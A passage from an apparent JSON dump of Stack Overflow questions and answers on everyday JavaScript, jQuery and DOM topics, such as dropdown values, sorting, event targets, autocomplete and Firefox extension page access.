            "answers": [
                {
                    "body": "<p>If your dropdown is something like this:</p>\n\n<pre><code>&lt;select id=\"thedropdown\"&gt;\n  &lt;option value=\"1\"&gt;one&lt;/option&gt;\n  &lt;option value=\"2\"&gt;two&lt;/option&gt;\n&lt;/select&gt;\n</code></pre>\n\n<p>Then you would use something like:</p>\n\n<pre><code>var a = document.getElementById(\"thedropdown\");\nalert(a.options[a.selectedIndex].value);\n</code></pre>\n\n<p>But a library like jQuery simplifies things:</p>\n\n<pre><code>alert($('#thedropdown').val());\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 20
                },
                {
                    "body": "<p>Like this:</p>\n\n<pre><code>$dd = document.getElementById(\"yourselectelementid\");\n$so = $dd.options[$dd.selectedIndex];\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<pre><code>var dd = document.getElementById(\"dropdownID\");\nvar selectedItem = dd.options[dd.selectedIndex].value;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Use the <code>value</code> property of the <code>&lt;select&gt;</code> element. For example:</p>\n\n<pre><code>var value = document.getElementById('your_select_id').value;\nalert(value);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<pre><code>&lt;select onchange = \"selectChanged(this.value)\"&gt;\n  &lt;item value = \"1\"&gt;one&lt;/item&gt;\n  &lt;item value = \"2\"&gt;two&lt;/item&gt;\n&lt;/select&gt;\n</code></pre>\n\n<p>and then the javascript...</p>\n\n<pre><code>function selectChanged(newvalue) {\n  alert(\"you chose: \" + newvalue);\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>If your dropdown list is something like this</p>\n\n<pre><code>&lt;select id=\"Colours\"&gt;\n\n&lt;option value=\"0\" &gt;select..&lt;/option&gt;\n&lt;option value=\"1\"&gt;Red&lt;/option&gt;\n&lt;option value=\"2\"&gt;Black&lt;/option&gt;\n&lt;option value=\"3\"&gt;Green&lt;/option&gt;\n&lt;option value=\"4\"&gt;Gold&lt;/option&gt;\n\n&lt;/select&gt;\n</code></pre>\n\n<p>Adding a button </p>\n\n<pre><code>&lt;button type=\"button\" onclick=\"getDropBox()\"&gt;Try it&lt;/button&gt;\n&lt;p id=\"demo1\"&gt;&lt;/p&gt;\n&lt;p id=\"demo2\"&gt;&lt;/p&gt;\n</code></pre>\n\n<p>Creating a method to get selected in the drop down</p>\n\n<pre><code>&lt;script&gt;\n    function getDropBox(){\n    var e = document.getElementById(\"Colours\");\n    var strval1 = e.options[e.selectedIndex].value;\n    var strval2 = e.options[e.selectedIndex].text;\n    document.getElementById(\"demo1\").innerHTML = strval1;\n    document.getElementById(\"demo2\").innerHTML = strval2;   \n}\n&lt;/script&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>How to determine what is selected in the drop down? In Javascript.</p>\n",
            "last_activity_date": 1393155961,
            "question_id": 4029281,
            "score": 8,
            "tags": [
                "javascript",
                "select",
                "drop-down-menu",
                "options"
            ],
            "title": "Get drop down value"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Assuming that you have an array of javascript objects, just use a custom sort function:</p>\n\n<pre><code>function custom_sort(a, b) {\n    return new Date(a.lastUpdated).getTime() - new Date(b.lastUpdated).getTime();\n}\nvar your_array = [\n    {lastUpdated: \"2010/01/01\"},\n    {lastUpdated: \"2009/01/01\"},\n    {lastUpdated: \"2010/07/01\"}\n];\n\nyour_array.sort(custom_sort);\n</code></pre>\n\n<p>The Array <code>sort</code> method sorts an array using a callback function that is passed pairs of elements in the array. </p>\n\n<ul>\n<li>If the return value is negative, the first argument (<code>a</code> in this case), will precede the second argument (<code>b</code>) in the sorted array. </li>\n<li>If the returned value is zero, their position with respect to each other remains unchanged. </li>\n<li>If the returned value is positive, <code>b</code> precedes <code>a</code> in the sorted array.</li>\n</ul>\n\n<p>You can read more on the <code>sort</code> method <a href=\"https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/sort\">here</a>.</p>\n",
                    "is_accepted": true,
                    "score": 16
                }
            ],
            "body": "<p>I know this must be relatively simple, but I have a dataset of JSON that I would like to sort by date.  So far, I've run into problems at every turn.\nRight now I have the date stored as <code>this.lastUpdated</code>.\nI have access to jquery if that helps, but I realize the .sort() is native JS.\nThanks in advance.</p>\n",
            "last_activity_date": 1368650721,
            "question_id": 3859239,
            "score": 8,
            "tags": [
                "javascript",
                "jquery",
                "json"
            ],
            "title": "sort JSON by date"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Use the function listed in <a href=\"http://stackoverflow.com/questions/901115/get-querystring-with-jquery/901144#901144\">the answer</a> to <a href=\"http://stackoverflow.com/questions/901115/get-querystring-with-jquery\">this question</a>:</p>\n\n<pre><code>function getParameterByName( name )\n{\n  name = name.replace(/[\\[]/,\"\\\\\\[\").replace(/[\\]]/,\"\\\\\\]\");\n  var regexS = \"[\\\\?&amp;]\"+name+\"=([^&amp;#]*)\";\n  var regex = new RegExp( regexS );\n  var results = regex.exec( window.location.href );\n  if( results == null )\n    return \"\";\n  else\n    return decodeURIComponent(results[1].replace(/\\+/g, \" \"));\n}\n</code></pre>\n\n<p>And then just do something like this:</p>\n\n<pre><code>var qParam = getParameterByName('q');\n$('#mytextbox').val(qParam);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>In my <a href=\"http://www.guffa.com/Programming_archive.aspx\" rel=\"nofollow\">programming archive</a> I have <a href=\"http://www.guffa.com/Programming_archive.aspx?id=16\" rel=\"nofollow\">this function</a>:</p>\n\n<pre><code>function querystring(key) {\n   var re=new RegExp('(?:\\\\?|&amp;)'+key+'=(.*?)(?=&amp;|$)','gi');\n   var r=[], m;\n   while ((m=re.exec(document.location.search)) != null) r.push(m[1]);\n   return r;\n}\n</code></pre>\n\n<p>You can use that to get the query string value and put in a textbox:</p>\n\n<pre><code>$('#SomeTextbox').val(querystring('q'));\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 22
                },
                {
                    "body": "<p>Take a look at ths url: \n<a href=\"http://jquery-howto.blogspot.com/2009/09/get-url-parameters-values-with-jquery.html\" rel=\"nofollow\">http://jquery-howto.blogspot.com/2009/09/get-url-parameters-values-with-jquery.html</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/901115/get-querystring-with-jquery\">get querystring with jQuery</a>  </p>\n</blockquote>\n\n\n\n<p>How do I get the value of a querystring into a textbox using jQuery?</p>\n\n<p>Lets say the url is <a href=\"http://intranet/page1.php?q=hello\">http://intranet/page1.php?q=hello</a></p>\n\n<p>I would like the \"hello\" to be in the textbox.</p>\n",
            "last_activity_date": 1403089102,
            "question_id": 3788125,
            "score": 8,
            "tags": [
                "javascript",
                "jquery"
            ],
            "title": "jQuery querystring"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>You can attach to many DOM events depending on the type of change you wish to listen for. Here's a page with all the DOM change events:</p>\n\n<p><a href=\"https://developer.mozilla.org/en/DOM_Events\" rel=\"nofollow\">https://developer.mozilla.org/en/DOM_Events</a></p>\n\n<p>The generic, catch-all DOM change event is <code>DOMSubtreeModified</code>. For example:</p>\n\n<pre><code>document.getElementById('abc').addEventListener('DOMSubtreeModified', f, false);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>There is no built-in event for this that's widely supported, unfortunately. You can use a jQuery plugin called <a href=\"http://docs.jquery.com/Plugins/livequery\" rel=\"nofollow\">livequery</a> though.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>If you must detect changes you can check the DOM mutation events. The <a href=\"http://en.wikipedia.org/wiki/DOM_events\" rel=\"nofollow\">DOM events wikipedia page</a> lists them all. However you should know that they are not supported in Internet Explorer and may fire too often in the browsers that support them. A brute force approach is to use <code>setTimeout</code> and check for changes by yourself. </p>\n\n<p>My experience shows though that the need for DOM change notifications can be avoided. Could you give more details about your exact requirements?</p>\n",
                    "is_accepted": true,
                    "score": 6
                }
            ],
            "body": "<p>Is there a simple way to know when the DOM has been changed ?</p>\n\n<p>Is there any built-in JavaScript/jQuery event/function for this ?</p>\n",
            "last_activity_date": 1339242129,
            "question_id": 3744706,
            "score": 8,
            "tags": [
                "javascript",
                "jquery",
                "dom",
                "javascript-events"
            ],
            "title": "How to identify when the DOM has been changed?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>The browser will not allow you to send an XHR to another domain other than the one the page is on.  This is for security purposes.</p>\n\n<p>One way around this that I have seen is to setup a proxy on the domain the page is hosted on that will pass requests through to the actual api server.  See <a href=\"http://ajaxpatterns.org/Cross-Domain_Proxy\" rel=\"nofollow\">http://ajaxpatterns.org/Cross-Domain_Proxy</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p><a href=\"http://en.wikipedia.org/w/api.php\">The Wikipedia API</a> does support <a href=\"http://stackoverflow.com/questions/2067472/please-explain-jsonp\">JSONP</a>.\nYour query string'll become something like this:</p>\n\n<pre><code>http://en.wikipedia.org/w/api.php?action=query&amp;format=json&amp;callback=test&amp;prop=langlinks&amp;lllimit=500&amp;titles=kaas\n</code></pre>\n\n<p>But you'll have to build the jsonp handler (or you can use your favorite library to do it), switch to json output format from the xml you choose and create the callback function to parse the result and do the stuff you need on the page.</p>\n",
                    "is_accepted": true,
                    "score": 15
                }
            ],
            "body": "<p>I am trying to implement a simple request to Wikipedia's API using AJAX (XMLHttpRequest). If I type the url in the address bar of Firefox, I get a neat XML, no sweat there. Yet, calling the exact same url with: </p>\n\n<pre><code>// this is my XMLHttpRequest object\nhttpObjectMain.open(\"GET\", \"http://en.wikipedia.org/w/api.php?action=query&amp;format=xml&amp;prop=langlinks&amp;lllimit=500&amp;titles=kaas\", true);\nhttpObjectMain.send(null);\n</code></pre>\n\n<p>returns an empty response. According to FireBug, I get a 200 OK response, but the content is just empty.</p>\n\n<p>I suspect I might be missing something on the header of the GET http request.</p>\n\n<p>Help! (and thanks!)</p>\n",
            "last_activity_date": 1411058688,
            "question_id": 2374377,
            "score": 8,
            "tags": [
                "javascript",
                "ajax",
                "api",
                "wikipedia",
                "xmlhttprequest"
            ],
            "title": "Query Wikipedia&#39;s API using AJAX (XMLHttpRequest)"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Yes. Some browsers limit to 4096, and split longer texts into multiple text node children of the parent element. If you look at the source to Apache CXF you will find some utility Java script to deal with this, if no place else.</p>\n\n<pre><code>// Firefox splits large text regions into multiple Text objects (4096 chars in\n// each). Glue it back together.\nfunction getNodeText(node) {\n    var r = \"\";\n    for (var x = 0;x &lt; node.childNodes.length; x++) {\n        r = r + node.childNodes[x].nodeValue;\n    }\n    return r;\n}\n</code></pre>\n\n<p>Also see:</p>\n\n<p><a href=\"http://svn.apache.org/repos/asf/cxf/trunk/rt/javascript/src/main/resources/org/apache/cxf/javascript\">http://svn.apache.org/repos/asf/cxf/trunk/rt/javascript/src/main/resources/org/apache/cxf/javascript/cxf-utils.js</a></p>\n\n<p>for more goodies in this neighborhood.</p>\n",
                    "is_accepted": false,
                    "score": 13
                },
                {
                    "body": "<p>by the way, you can use <a href=\"https://developer.mozilla.org/En/DOM/Node.normalize\" rel=\"nofollow\">normalize</a> method to join all contiguous TextNode into one instead of looping them to obtain the text.</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>How is it that I always get only the first 4096 chars of a valid XML text node? (using JavaScript...) is a text node limited?</p>\n",
            "last_activity_date": 1398618787,
            "question_id": 1967741,
            "score": 8,
            "tags": [
                "javascript",
                "xml",
                "textnode"
            ],
            "title": "Is there a 4096 character limit for JavaScript XML text nodes?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>pass in <code>this</code> in the inline click handler</p>\n\n<pre><code>&lt;a href=\"123.com\" onclick=\"click123(this);\"&gt;link&lt;/a&gt;\n</code></pre>\n\n<p>or use <code>event.target</code> in the function (according to the <a href=\"http://www.w3.org/TR/DOM-Level-2-Events/events.html\">W3C DOM Level 2 Event model</a>)</p>\n\n<pre><code>function click123()\n{\n    var a = event.target;\n}\n</code></pre>\n\n<p>But of course, <a href=\"http://www.quirksmode.org/js/events%5Fproperties.html\">IE is different</a>, so the vanilla JavaScript way of handling this is</p>\n\n<pre><code>function doSomething(e) {\n    var targ;\n    if (!e) var e = window.event;\n    if (e.target) targ = e.target;\n    else if (e.srcElement) targ = e.srcElement;\n    if (targ.nodeType == 3) // defeat Safari bug\n        targ = targ.parentNode;\n}\n</code></pre>\n\n<p>or less verbose</p>\n\n<pre><code>function doSomething(e) {\n\n    e = e || window.event;\n    var targ = e.target || e.srcElement;\n    if (targ.nodeType == 3) targ = targ.parentNode; // defeat Safari bug\n}\n</code></pre>\n\n<p>where <code>e</code> is the <code>event object</code> that is passed to the function in browsers other than IE.</p>\n\n<p>If you're using jQuery though, I would strongly encourage unobtrusive JavaScript and use jQuery to bind event handlers to elements.</p>\n",
                    "is_accepted": true,
                    "score": 28
                },
                {
                    "body": "<p><a href=\"http://docs.jquery.com/Events/jQuery.Event\" rel=\"nofollow\">http://docs.jquery.com/Events/jQuery.Event</a></p>\n\n<p>Try with <code>event.target</code></p>\n\n<blockquote>\n  <p>Contains the DOM element that issued\n  the event. This can be the element\n  that registered for the event or a\n  child of it.</p>\n</blockquote>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>The easiest way is to pass <strong>this</strong> to the click123 function  or\nyou can also do something like this(cross-browser):</p>\n\n<pre><code>function click123(e){\n  e = e || window.event;\n  var src = e.target || e.srcElement;\n  //src element is the eventsource\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>The thing with your method is that you clutter your HTML with javascript. If you put your javascript in an external file you can access your HTML unobtrusive and this is much neater.</p>\n\n<p>Lateron you can expand your code with addEventListener/attackEvent(IE) to prevent memory leaks.</p>\n\n<p>This is without jQuery</p>\n\n<pre><code>&lt;a href=\"123.com\" id=\"elementid\"&gt;link&lt;/a&gt;\n\nwindow.onload = function () {\n  var el = document.getElementById('elementid');\n  el.onclick = function (e) {\n    var ev = e || window.event;\n    // here u can use this or el as the HTML node\n  }\n}\n</code></pre>\n\n<p>You say you want to manipulate it with jQuery. So you can use jQuery. Than it is even better to do it like this:</p>\n\n<pre><code>// this is the window.onload startup of your JS as in my previous example. The difference is \n// that you can add multiple onload functions\n$(function () {\n  $('a#elementid').bind('click', function (e) {\n    // \"this\" points to the &lt;a&gt; element\n    // \"e\" points to the event object\n  });\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>i need to have a handler on the calling object of onclick event</p>\n\n<p>ie</p>\n\n<pre><code>&lt;a href=\"123.com\" onclick=\"click123(event);\"&gt;link&lt;/a&gt;\n&lt;script&gt;\nfunction click123(event)\n{\n//i need &lt;a&gt; so i can manipulate it with Jquery \n}\n&lt;/script&gt;\n</code></pre>\n\n<p>I want to do this without the use of $().click or $().live of jquery but with the method described above.</p>\n",
            "last_activity_date": 1255354484,
            "question_id": 1553661,
            "score": 8,
            "tags": [
                "javascript",
                "jquery",
                "html"
            ],
            "title": "How to get the onclick calling object?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>I don't know of any way to do it on the client side, but I am not sure about that. What you could do, is parsing the HTML code and any referenced gif on the server side and add a class to these images. But that is not really recommended because it involves at least one additional parsing of HTML + parsing of every gif. As you can see from <a href=\"http://us.php.net/manual/en/function.imagecreatefromgif.php#59787\" rel=\"nofollow\">this example in PHP</a>, checking the gifs is also not trivial in terms of CPU load.</p>\n",
                    "is_accepted": true,
                    "score": 0
                },
                {
                    "body": "<p>I just wrote some JS that detects animated gifs. Works in most modern browsers except IE 9.</p>\n\n<p><strong>Disclaimer:</strong> this only works if the domain origin of the image is the same as the page you are loading the script from.</p>\n\n<p>See the gist for the latest version of the code: <a href=\"https://gist.github.com/3012623\">https://gist.github.com/3012623</a></p>\n\n<pre><code>function isAnimatedGif(src, cb) {\n    var request = new XMLHttpRequest();\n    request.open('GET', src, true);\n    request.responseType = 'arraybuffer';\n    request.addEventListener('load', function () {\n        var arr = new Uint8Array(request.response),\n            i, len, length = arr.length, frames = 0;\n\n        // make sure it's a gif (GIF8)\n        if (arr[0] !== 0x47 || arr[1] !== 0x49 || \n            arr[2] !== 0x46 || arr[3] !== 0x38)\n        {\n            cb(false);\n            return;\n        }\n\n        //ported from php http://www.php.net/manual/en/function.imagecreatefromgif.php#104473\n        //an animated gif contains multiple \"frames\", with each frame having a \n        //header made up of:\n        // * a static 4-byte sequence (\\x00\\x21\\xF9\\x04)\n        // * 4 variable bytes\n        // * a static 2-byte sequence (\\x00\\x2C) (some variants may use \\x00\\x21 ?)\n        // We read through the file til we reach the end of the file, or we've found \n        // at least 2 frame headers\n        for (i=0, len = length - 9; i &lt; len, frames &lt; 2; ++i) {\n            if (arr[i] === 0x00 &amp;&amp; arr[i+1] === 0x21 &amp;&amp;\n                arr[i+2] === 0xF9 &amp;&amp; arr[i+3] === 0x04 &amp;&amp;\n                arr[i+8] === 0x00 &amp;&amp; \n                (arr[i+9] === 0x2C || arr[i+9] === 0x21))\n            {\n                frames++;\n            }\n        }\n\n        // if frame count &gt; 1, it's animated\n        cb(frames &gt; 1);\n    });\n    request.send();\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 10
                }
            ],
            "body": "<p>Is it possible to detect animated gif images client side? </p>\n\n<p>In Internet Explorer you can use the <code>onload</code> event for this, since it willl be fired for <a href=\"http://webbugtrack.blogspot.com/2007/11/bug-208-onload-event-fires-for-every.html\">every frame loaded</a> (behaviour changed in IE8). </p>\n\n<p>But is there a way for other browsers too?</p>\n",
            "last_activity_date": 1378302445,
            "question_id": 1326890,
            "score": 8,
            "tags": [
                "javascript"
            ],
            "title": "Is it possible to detect animated gif images client side?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p><code>formatItem</code> formats an item for display in the dropdown list, while <code>formatResult</code> formats the item for display in the inputbox once it is selected.</p>\n\n<p>By default, autocomplete expects to get data from the specified url formatted as: </p>\n\n<pre><code>foo|bar|baz|bing\nzaz|ding|blop|grok\n</code></pre>\n\n<p>where each line is a row of data; each row being the data that it passes to <code>formatItem</code> and <code>formatResult</code>. You may want to take the path of least resistance and return data in the way it likes.</p>\n\n<p>If you want to use data that doesn't fit autocomplete's assumptions, you'll need to use the (undocumented, as far as I can tell) parse option to identify a function to parse the results of your ajax request. It appears to me that your django view is returning an array rather than returning a formatted string. To format your array as jquery would like it:</p>\n\n<pre><code>return HttpResponse('|'.join(your_array), mimetype='text/plain')\n</code></pre>\n\n<p>Here is an example of doing autocomplete using non-standard autocomplete data (JSON):</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt; \n  format_item = function (item, position, length){ \n    return item.title; \n  } \n\n // Handle data from ajax request \n prep_data = function(data){ \n   tmp = $.evalJSON(data); \n   parsed_data = []; \n   for (i=0; i &lt; tmp.length; i++) { \n     obj = tmp[i]; \n     // Other internal autocomplete operations expect \n     // the data to be split into associative arrays of this sort \n     parsed_data[i] = { \n        data: obj , \n        value: obj.isbn13, \n        result: obj.title \n     }; \n   } \n   return parsed_data \n } \n\n $(document).ready(function(){ \n   $(\"#fop\").autocomplete({ \n          url : \"{% url book-search %}\", \n          // undocumented \n          parse: prep_data, \n          formatItem: format_item, \n          }); \n }) \n\n&lt;/script&gt;\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 16
                },
                {
                    "body": "<p>I have not been able to get formatMatch and formatResult to work so far.  I am still working on the 'correct' way to use them.  However, as a workaround you can use the parse option as follows.  Just to be clear, in this example, formatItem and parse are functional while formatResult and formatMatch are not functional.</p>\n\n<pre><code>jQuery(function(){\n   $('#profile-tabs_addresses_grid_b_a_PostalCode').autocomplete\n('http://test.mydomain.com/locality/postalcodes/', {\n       minChars:1,\n       delay:400,\n       cacheLength:100,\n       matchContains:true,\n       max:10,\n       formatItem:function(item, index, total, query){\n           return item.PostalCode + ': ' + item.Region + ', ' +\nitem.City + ', ' + item.Country;\n       },\n       formatMatch:function(item){\n           return item.PostalCode;\n       },\n       formatResult:function(item){\n           return item.PostalCode;\n       },\n       dataType:'json',\n       parse:function(data) {\n                       return $.map(data, function(item) {\n                               return {\n                                       data: item,\n                                       value: item.PostalCode,\n                                       result: item.PostalCode\n                               }\n                       });\n               }});\n});\n</code></pre>\n\n<p>here is the json data that comes back from the data url ( whitespace\nadded for easier viewing ):</p>\n\n<pre><code>[\n       {City:\"St. Louis\", Country:\"USA\", PostalCode:\"63103\", ID:3,\nRegion:\"Missouri\"},\n       {City:\"St. Louis\", Country:\"USA\", PostalCode:\"63109\", ID:1,\nRegion:\"Missouri\"},\n       {City:\"St. Louis\", Country:\"USA\", PostalCode:\"63119\", ID:2,\nRegion:\"Missouri\"}\n]\n</code></pre>\n\n<p>When I type a 6 in the postal code box, it shows all three options\nproperly formatted as:</p>\n\n<pre><code>63103: Missouri, St. Louis, USA\n63109: Missouri, St. Louis, USA\n63119: Missouri, St. Louis, USA\n</code></pre>\n\n<p>and when I select one the textbox receives just the selected \npostal code.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>Am a bit confused here, what does the formatResult and formatItem do in the JQuery Autocomplete plugin?</p>\n\n<p>I have a function that is returning a comma separated string (from Django), but my autocomplete function is unable to split the string into individual entries/rows, how can i achieve this using autocomplete functions? </p>\n\n<p>e.g the returned result looks like this and this what autocomplete is showing :-\n<strong>[\"one\",\"oneTwo\", \"Onethree\", \"anotherOne\"]</strong></p>\n\n<p>I want when showing in the autocomplete field to have it split like this:-</p>\n\n<pre><code>one\noneTwo\nOnethree\nanotherOne\n</code></pre>\n\n<p>I have a feeling i can use the formatResult and formatItem but i dont know how, there are no good examples out there !!</p>\n\n<p>my code in the html template:</p>\n\n<pre><code> function autoFill(){\n           $(\"#tags\").autocomplete(\"/taglookup/\", {\n    \twidth: 320,\n    \tmax: 4,\n    \thighlight: false,\n    \tmultiple: true,\n    \tmultipleSeparator: \" \",\n    \tscroll: true,\n    \tscrollHeight: 300\n         });\n       }\n</code></pre>\n\n<p>Am using Dajango to process the GET request.</p>\n\n<p>Gath</p>\n",
            "last_activity_date": 1266770959,
            "question_id": 737453,
            "score": 8,
            "tags": [
                "javascript",
                "jquery",
                "django"
            ],
            "title": "What does formatResult and formatItem options do in JQuery Autocomplete?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p><a href=\"https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Core_Language_Features#Literals\" rel=\"nofollow\">Mozilla.org</a> has very good explanation of the different literals with examples.</p>\n\n<blockquote>\n  <p><strong>Array Literals</strong></p>\n  \n  <p>An array literal is a list of zero or\n  more expressions, each of which\n  represents an array element, enclosed\n  in square brackets ([]). When you\n  create an array using an array\n  literal, it is initialized with the\n  specified values as its elements, and\n  its length is set to the number of\n  arguments specified.</p>\n  \n  <p><strong>Object Literals</strong></p>\n  \n  <p>An object literal is a list of zero or\n  more pairs of property names and\n  associated values of an object,\n  enclosed in curly braces ({}). You\n  should not use an object literal at\n  the beginning of a statement. This\n  will lead to an error or not behave as\n  you expect, because the { will be\n  interpreted as the beginning of a\n  block.</p>\n</blockquote>\n",
                    "is_accepted": true,
                    "score": 9
                },
                {
                    "body": "<p>The difference is the way they're indexed.<br />\nObjects have name, value pairs which are not ordered. In some browsers the order you added values will be the order you get when you traverse the object but not in all. The name is usually a string.<br />\nArrays are numerically indexed and the order is totally reliable</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Object literal</p>\n\n<pre><code>var a = {};\n</code></pre>\n\n<p>Array Literal</p>\n\n<pre><code>var a = [];\n</code></pre>\n\n<p>That's it!</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>What is the difference between Object Literals and Array Literals in JavaScript? I know it has something to do with the length method but i don't fully understand it. </p>\n",
            "last_activity_date": 1307631252,
            "question_id": 500583,
            "score": 8,
            "tags": [
                "javascript"
            ],
            "title": "JavaScript Object Literals &amp; Array Literals"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>You can do it, but you need to have control over the page and be able to raise the privilege level for the script. <a href=\"http://developer.mozilla.org/en/How_to_Build_an_XPCOM_Component_in_Javascript\" rel=\"nofollow\">Mozilla Documentation gives an example</a> - search for \"Privilege\" on the page.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>It is for security reasons that you have limited access to the content page from extension. See <a href=\"http://developer.mozilla.org/en/docs/XPCNativeWrapper\">XPCNativeWrapper</a> and <a href=\"http://developer.mozilla.org/en/Safely_accessing_content_DOM_from_chrome\">Safely accessing content DOM from chrome</a>,</p>\n\n<p>If you control the page, the best way to do this is set up an event listener in the page and dispatch an event from your extension (addEventListener in the page, dispatchEvent in the extension).</p>\n\n<p>Otherwise, see <a href=\"http://groups.google.com/group/mozilla.dev.extensions/msg/bdf1de5fb305d365\">http://groups.google.com/group/mozilla.dev.extensions/msg/bdf1de5fb305d365</a></p>\n",
                    "is_accepted": true,
                    "score": 8
                },
                {
                    "body": "<pre><code>document.wrappedJSObject.funcToBeCalled();\n</code></pre>\n\n<p>This is <strong>not secure</strong> and allows a malicious page to elevate its permissions to those of your extension...  But, it does do what you asked.  Read up on the early <a href=\"http://www.oreillynet.com/pub/a/network/2005/11/01/avoid-common-greasemonkey-pitfalls.html?page=1\">greasemonkey vulnerabilities</a> for why this is a bad idea.</p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>I have a very simpler way to do it.\nSuppose you have to call xyz() function which is written on page. and you have to call it from your pluggin.</p>\n\n<p>create a button (\"make it invisible. so it wont disturb your page\"). on onclick of that button call this xyz() function. </p>\n\n<pre><code>&lt;input type=\"button\" id=\"testbutton\" onclick=\"xyz()\" /&gt;\n</code></pre>\n\n<p>now in pluggin you have a document object for the page. suppose its mainDoc</p>\n\n<p>where you want to call xyz(), just execute this line</p>\n\n<pre><code>mainDoc.getElementById('testbutton').click();\n</code></pre>\n\n<p>it will call the xyz() function. </p>\n\n<p>good luck :)</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I'm creating a Firefox extension for demo purposes.\nI to call a specific JavaScript function in the document from the extension.\nI wrote this in my HTML document (not inside extension, but a page that is loaded by Firefox):</p>\n\n<pre><code>document.funcToBeCalled = function() {\n   // function body\n};\n</code></pre>\n\n<p>Then, the extension will run this on some event:</p>\n\n<pre><code>var document = Application.activeWindow.activeTab.document;\ndocument.funcToBeCalled();\n</code></pre>\n\n<p>However it raises an error saying that <code>funcToBeCalled</code> is not defined.</p>\n\n<p>Note: I could get an element on the document by calling <code>document.getElementById(id);</code></p>\n",
            "last_activity_date": 1316651096,
            "question_id": 151555,
            "score": 8,
            "tags": [
                "javascript",
                "firefox",
                "dom",
                "document"
            ],
            "title": "How do I execute a page-defined JavaScript function from a Firefox extension?"
        },
        {
            "answer_count": 8,
            "answers": [
                {
                    "body": "<pre><code>&lt;h:commandLink id=\"myCommandLink\" action=\"#{myPageCode.doDelete}\"&gt;\n\t&lt;h:outputText value=\"#{msgs.deleteText}\" /&gt;\n&lt;/h:commandLink&gt;\n&lt;script type=\"text/javascript\"&gt;\nif (document.getElementById) {\n\tvar commandLink = document.getElementById('&lt;c:out value=\"${myPageCode.myCommandLinkClientId}\" /&gt;');\n\tif (commandLink &amp;&amp; commandLink.onclick) {\n\t\tvar commandLinkOnclick = commandLink.onclick;\n\t\tcommandLink.onclick = function() {\n\t\t\tvar result = confirm('Do you really want to &lt;c:out value=\"${msgs.deleteText}\" /&gt;?');\n\t\t\tif (result) {\n\t\t\t\treturn commandLinkOnclick();\n\t\t\t}\n\t\t\treturn false;\n\t\t}\n\t}\n}\n&lt;/script&gt;\n</code></pre>\n\n<p>Other Javascript actions (like validating form input etc) could be performed by replacing the call to <code>confirm()</code> with a call to another function.</p>\n",
                    "is_accepted": true,
                    "score": 7
                },
                {
                    "body": "<p>You can still use onclick. The JSF <a href=\"http://java.sun.com/javaee/javaserverfaces/1.2/docs/renderkitdocs/HTML_BASIC/javax.faces.Commandjavax.faces.Link.html\" rel=\"nofollow\">render kit specification</a> (see Encode Behavior) describes how the link should handle it. Here is the important part (what it renders for onclick):</p>\n\n<pre><code>var a=function(){/*your onclick*/}; var b=function(){/*JSF onclick*/}; return (a()==false) ? false : b();\n</code></pre>\n\n<p>So your function wont be passed the event object (which isn't reliable cross browser anyway), but returning true/false will short-circuit the submission.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>In JSF 1.2 you can specify onclick events.</p>\n\n<p>Also, other libraries such as <a href=\"http://myfaces.apache.org/\" rel=\"nofollow\">MyFaces</a> or <a href=\"http://www.icefaces.org\" rel=\"nofollow\">IceFaces</a> implement the \"onclick\" handler.</p>\n\n<p>What you'd need to do then is simply:</p>\n\n<pre><code>&lt;h:commandLink action=\"#{bean.action}\" onclick=\"if(confirm('Are you sure?')) return false;\" /&gt;\n</code></pre>\n\n<p>Note: you can't just do <code>return confirm(...)</code> as this will block the rest of the JavaScript in the onClick event from happening, which would effectively stop your action from happening no matter what the user returned!</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
